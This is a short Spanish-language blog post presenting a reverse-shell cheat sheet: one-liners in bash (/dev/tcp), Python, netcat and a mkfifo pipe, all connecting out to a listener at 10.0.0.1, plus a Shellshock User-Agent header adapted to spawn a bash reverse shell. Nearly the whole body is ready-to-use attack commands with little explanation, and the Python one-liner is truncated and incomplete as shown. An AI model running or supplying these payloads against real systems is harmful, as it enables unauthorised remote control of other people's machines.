---
date: 2021-09-15T00:22:05.000Z
layout: post
comments: true
title: Reverse Shell
subtitle: 'y como obtener acceso'
description: >-
image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
optimized_image: >-
  http://imgfz.com/i/8lyF7VZ.jpeg
category: ciberseguridad
tags:
  - explotación
  - linux
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---
# Ejemplos principales:
### Bash
```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
### Python
```bash
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```
### Netcat
```bash
#Versiones actualizadas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ nc -e /bin/sh 10.0.0.1 1234

#Versiones más antiguas
┌─[root@kali]─[/home/user/demo/exploit]
└──╼ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
### Ejemplo de uso
En burpsuite se podría ocupar en ataques como Shellshock, por ejemplo:
```bash
#Se ocupa como base un proceso como este...
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```
```bash
#Acá se adapta el proceso...
User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```
